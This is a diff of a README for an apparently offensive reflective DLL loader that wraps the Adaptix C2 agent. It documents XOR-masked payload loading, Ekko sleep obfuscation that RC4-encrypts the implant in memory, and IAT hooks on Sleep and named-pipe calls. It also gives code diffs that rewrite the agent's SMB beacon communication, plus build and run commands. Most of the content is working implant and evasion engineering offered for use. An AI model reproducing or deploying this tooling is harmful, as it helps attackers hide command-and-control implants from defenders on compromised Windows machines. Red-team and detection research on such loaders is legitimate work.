@@ -6,17 +6,16 @@ A Reflective DLL Loader for [Adaptix C2](https://github.com/Jekoie/Adaptix) buil
 
 1. **Loads the Adaptix agent DLL** from a PIC blob via a custom reflective loader.
 2. **XOR resource masking** — the DLL is XOR-encrypted at link time with a random 128-byte key (via Crystal Palace `generate`/`xor`/`preplen` directives). At runtime the loader decrypts it into a temporary buffer, maps it, then wipes and frees the cleartext copy.
-3. **Hooks `Sleep` via IAT interception** — a PICO hijacks `GetProcAddress` at import resolution time so the DLL's `Sleep` call is transparently redirected.
-4. **Ekko sleep obfuscation** — when `Sleep` is called, the entire DLL image is RC4-encrypted in memory via a 6-step `NtContinue` ROP chain (timer queue callbacks), then decrypted on wake.
-5. **Per-section permission restore** — after decryption, a PE section walker applies the correct page protections (`.text` → `RX`, `.data` → `RW`, etc.) instead of blanket `RWX`, ensuring BOF compatibility.
-6. **PIC cleanup** — after `go()` returns, the loader's own RWX allocation is wiped and freed.
+3. **Ekko sleep obfuscation** — when `Sleep`, `ConnectNamedPipe`, `FlushFileBuffers` or `WaitForSingleObjectEx` are called, the entire DLL image is RC4-encrypted in memory via a 6-step `NtContinue` ROP chain (timer queue callbacks), then decrypted on wake.
+4. **Per-section permission restore** — after decryption, a PE section walker applies the correct page protections (`.text` → `RX`, `.data` → `RW`, etc.) instead of blanket `RWX`, ensuring BOF compatibility.
+5. **PIC cleanup** — after `go()` returns, the loader's own RX allocation is wiped and freed.
 
 ## Project Structure
 
 ```
 src/
   loader.c                # Main PIC — XOR-unmasks DLL, loads PICO, maps DLL, fixes permissions, calls entry point
-  hooks.c                 # _Sleep hook → EkkoObf() + restore_section_permissions()
+  hooks.c                 # _Sleep, _ConnectNamedPipe, _FlushFileBuffers, _WaitForSingleObjectEx hooks → EkkoObf() + restore_section_permissions()
   pico.c                  # PICO — hooked GetProcAddress, setup_hooks(), set_image_info()
   services.c              # API resolution via hash walking
   loader.h                # PE export lookup helper
@@ -54,18 +53,214 @@ output/                   # Final compiled binaries (agent.exe, agent.dll)
 - MinGW cross-compiler (`x86_64-w64-mingw32-gcc`)
 - Go (for `compile.go` build orchestrator)
 - Clang (`clang++` targeting `x86_64-w64-mingw32`) for final binary compilation
-- Adaptix agent DLL (compiled with `&Sleep` instead of PEB walk — see below)
+
+## 🛠 Required Adaptix Source Changes
+
+To support IAT hooking and the improved Overlapped IPC model, you must apply the following modifications to the Adaptix agent source before compilation.
 
 ## Adaptix Source Change
 
-Adaptix resolves `Sleep` via PEB walking (`GetSymbolAddress`), bypassing the IAT. For Crystal Palace hooking to work, change `ApiLoader.cpp`:
+### ApiLoader.cpp (ApiLoad function)
+Force `Sleep` to go through the Import Address Table (IAT) so the loader can hook it:
 
 ```diff
 - ApiWin->Sleep = (decltype(Sleep)*)GetSymbolAddress(hKernel32Module, HASH_FUNC_SLEEP);
 + ApiWin->Sleep = &Sleep;
 ```
 
-This forces a real IAT entry that `addhook` can intercept.
+### ConnectorSMB.h (Header Updates)
+```diff
+struct SMBFUNC {
+    // ...
++    DECL_API(CreateEventA);
++    DECL_API(WaitForSingleObjectEx);
++    DECL_API(GetOverlappedResult);
++    DECL_API(CloseHandle);
++    DECL_API(ResetEvent);
+};
+```
+
+```diff
+-void SendData(BYTE* data, ULONG data_size);
++void SendData(BYTE* data, ULONG data_size, BOOL expectResponse);
++BOOL PerformOverlappedIO(BOOL isRead, LPVOID buffer, DWORD length, LPDWORD transferred);
+```
+
+### ConnectorSMB.cpp (IPC Logic Rewrite)
+```diff
+- this->functions->ConnectNamedPipe    = (decltype(ConnectNamedPipe)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CONNECTNAMEDPIPE);
+- this->functions->FlushFileBuffers    = (decltype(FlushFileBuffers)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_FLUSHFILEBUFFERS);
++  this->functions->ConnectNamedPipe    = &ConnectNamedPipe;
++  this->functions->FlushFileBuffers    = &FlushFileBuffers;
++  this->functions->WaitForSingleObjectEx = &WaitForSingleObjectEx;
++  this->functions->CreateEventA        = (decltype(CreateEventA)*)        GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CREATEEVENTA);
++  this->functions->GetOverlappedResult  = (decltype(GetOverlappedResult)*)  GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_GETOVERLAPPEDRESULT);
++  this->functions->CloseHandle         = (decltype(CloseHandle)*)         GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CLOSEHANDLE);
++  this->functions->ResetEvent           = (decltype(ResetEvent)*)           GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_RESETEVENT);
+
+```
+
+```diff
++BOOL ConnectorSMB::PerformOverlappedIO(BOOL isRead, LPVOID buffer, DWORD length, LPDWORD transferred) {
++    OVERLAPPED ov = { 0 };
++    ov.hEvent = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL);
++    if (!ov.hEvent) return FALSE;
++
++    BOOL success = isRead ? 
++        this->functions->ReadFile(this->hChannel, buffer, length, NULL, &ov) :
++        this->functions->WriteFile(this->hChannel, buffer, length, NULL, &ov);
++
++    if (!success && this->functions->GetLastError() == ERROR_IO_PENDING) {
++        this->functions->WaitForSingleObjectEx(ov.hEvent, INFINITE, TRUE);
++        success = TRUE;
++    }
++
++    if (success) success = this->functions->GetOverlappedResult(this->hChannel, &ov, transferred, FALSE);
++    this->functions->CloseHandle(ov.hEvent);
++    return success;
++}
+```
+
+```diff
+-void ConnectorSMB::SendData(BYTE* data, ULONG data_size)
+-{
+-    this->recvSize = 0;
+-
+-    if (data && data_size) {
+-        DWORD NumberOfBytesWritten = 0;
+-        if ( this->functions->WriteFile(this->hChannel, (LPVOID)&data_size, 4, &NumberOfBytesWritten, NULL) ) {
+-            
+-            DWORD index = 0;
+-            DWORD size  = 0;
+-            NumberOfBytesWritten = 0;
+-            while (1) {
+-                size = data_size - index;
+-                if (data_size - index > 0x2000)
+-                    size = 0x2000;
+-
+-                if ( !this->functions->WriteFile(this->hChannel, data + index, size, &NumberOfBytesWritten, 0) )
+-                    break;
+-
+-                index += NumberOfBytesWritten;
+-                if (index >= data_size)
+-                    break;
+-            }
+-        }
+-        this->functions->FlushFileBuffers(this->hChannel);
+-    }
+-
+-    DWORD totalBytesAvail = 0;
+-    BOOL result = this->functions->PeekNamedPipe(this->hChannel, 0, 0, 0, &totalBytesAvail, 0);
+-    if (result && totalBytesAvail >= 4) {
+-
+-        DWORD NumberOfBytesRead = 0;
+-        DWORD dataLength = 0;
+-        if ( this->functions->ReadFile(this->hChannel, &dataLength, 4, &NumberOfBytesRead, 0) ) {
+-            
+-            if (dataLength > this->allocaSize) {
+-                this->recvData = (BYTE*) this->functions->LocalReAlloc(this->recvData, dataLength, 0);
+-                this->allocaSize = dataLength;
+-            }
+-
+-            NumberOfBytesRead = 0;
+-            int index = 0;
+-            while( this->functions->ReadFile(this->hChannel, this->recvData + index, dataLength - index, &NumberOfBytesRead, 0) && NumberOfBytesRead) {
+-                index += NumberOfBytesRead;
+-        
+-                if (index > dataLength) {
+-                    this->recvSize = -1;
+-                    return;
+-                }
+-
+-                if (index == dataLength)
+-                    break;
+-            }
+-            this->recvSize = index;
+-        }
+-    }
+-}
+
++void ConnectorSMB::SendData(BYTE* data, ULONG data_size, BOOL expectResponse) 
++{
++    this->recvSize = 0;
++    DWORD transferred = 0;
++
++    if (data && data_size) {
++        if (!this->PerformOverlappedIO(FALSE, &data_size, 4, &transferred) || transferred != 4) {
++            return;
++        }
++
++        DWORD index = 0;
++        while (index < data_size) {
++            DWORD chunkSize = (data_size - index > 0x2000) ? 0x2000 : (data_size - index);
++            if (!this->PerformOverlappedIO(FALSE, data + index, chunkSize, &transferred)) break;
++            index += transferred;
++        }
++        this->functions->FlushFileBuffers(this->hChannel);
++    }
++
++    if (!expectResponse) {
++        return;
++    }
++
++    DWORD responseLength = 0;
++    if (!this->PerformOverlappedIO(TRUE, &responseLength, 4, &transferred) || transferred != 4) {
++        return;
++    }
++
++    if (responseLength > 0x1000000) return; 
++
++    if (responseLength > this->allocaSize) {
++        this->recvData = (BYTE*)this->functions->LocalReAlloc(this->recvData, responseLength, LMEM_MOVEABLE | LMEM_ZEROINIT);
++        this->allocaSize = responseLength;
++    }
++
++    if (this->PerformOverlappedIO(TRUE, this->recvData, responseLength, &transferred)) {
++        this->recvSize = transferred;
++    }
++}
+```
+
+### MainAgent.cpp (Change BEACON_SMB logic)
+```diff
+do {
+- g_Connector->SendData(beat, beatSize);
++ g_Connector->SendData(beat, beatSize, TRUE);
+    while ( g_Connector->RecvSize() >= 0 && g_Agent->IsActive() ) {
+        // ... (Processing logic) ...
+
+        if (packerOut->datasize() > 4) {
+            // ... (Encryption logic) ...
+            
+-            g_Connector->SendData(packerOut->data(), packerOut->datasize());
++            g_Connector->SendData(packerOut->data(), packerOut->datasize(), TRUE);
+
+            packerOut->Clear(TRUE);
+            packerOut->Pack32(0);
+        }
+        else {
+-            g_Connector->SendData(NULL, 0);            
++            g_Connector->SendData(NULL, 0, TRUE);
+        }
+
+        if (g_Connector->RecvSize() == 0 && this->functions->GetLastError() == ERROR_BROKEN_PIPE) {
+            break;
+        }
+    }
+
+    if (!g_Agent->IsActive()) {
+        g_Agent->commander->Exit(packerOut);
+        packerOut->Set32(0, packerOut->datasize());
+        EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
+
+-        g_Connector->SendData(packerOut->data(), packerOut->datasize());        
++        g_Connector->SendData(packerOut->data(), packerOut->datasize(), FALSE);
+        packerOut->Clear(TRUE);
+    }
+
+    g_Connector->Disconnect();
+// ...
+}
 
 ## Build
 
@@ -91,14 +286,9 @@ go run compile.go -dll /path/to/agent.x64.dll -skip-coff -format exe       # ski
 | `-pic` | `agent.bin` | Path to pre-built PIC blob (used with `-skip-link`) |
 | `-debug` | `false` | Compile with `-mconsole` instead of `-mwindows` |
 
-## Test Harness
-
 ```bash
-# Compile
-x86_64-w64-mingw32-gcc -DWIN_X64 loader/test/run.c -o run.x64.exe -lws2_32
-
 # Run
-.\run.x64.exe build/agent.bin
+.\agent.exe
 ```
 
 ## Resource Masking
